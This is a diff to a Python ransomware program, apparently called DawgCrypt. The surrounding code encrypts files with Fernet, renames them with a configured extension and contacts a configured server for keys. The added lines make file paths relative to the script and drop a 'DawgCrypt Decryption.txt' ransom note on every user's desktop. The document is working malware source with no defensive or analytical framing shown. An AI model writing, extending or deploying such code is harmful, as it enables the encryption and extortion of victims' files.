@@ -2,6 +2,7 @@ import configparser
 import os
 import pathlib
 import tkinter.messagebox
+import glob
 
 from cryptography.fernet import Fernet
 import urllib.request
@@ -12,7 +13,7 @@ import tkinter as tk
 from tkinter.ttk import *
 
 config=configparser.ConfigParser()
-config.read('config.ini')
+config.read(os.path.dirname(__file__)+'/config.ini')
 server=config.get('Configuration','server')
 program_name=config.get('Configuration','name')
 enc_ext=config.get('Configuration','extension')
@@ -46,6 +47,7 @@ def do_encrption():
                     file.write(encrypted)
                     file.truncate()
                 os.rename(str(f),str(f)+"."+enc_ext)
+            create_help_file()
             succeeded=True
         except(urllib.error.URLError):
             sleep(wait_time)
@@ -87,8 +89,17 @@ def request_key():
     except:
         pass
 
+def create_help_file():
+    user_desktops = glob.glob('C:/Users/*/Desktop')
+    for d in user_desktops:
+        try:
+            with open(d+'/DawgCrypt Decryption.txt', 'w') as help_file:
+                help_file.write("Run {} for decryption instructions".format(__file__))
+        except:
+            pass
+
 if __name__ == '__main__':
-    if(pathlib.Path('uuid').is_file()):
+    if(pathlib.Path(os.path.dirname(__file__)+'/uuid').is_file()):
         try:
             with open('uuid', 'r') as uuid_file:
                 encryption_uuid = uuid_file.read()
@@ -109,7 +120,7 @@ if __name__ == '__main__':
         window.mainloop()
     else:
         try:
-            with open('uuid', 'w') as uuid_file:
+            with open(os.path.dirname(__file__)+'/uuid', 'w') as uuid_file:
                 encryption_uuid = uuid.uuid4()
                 uuid_file.write(str(encryption_uuid))
             do_encrption()
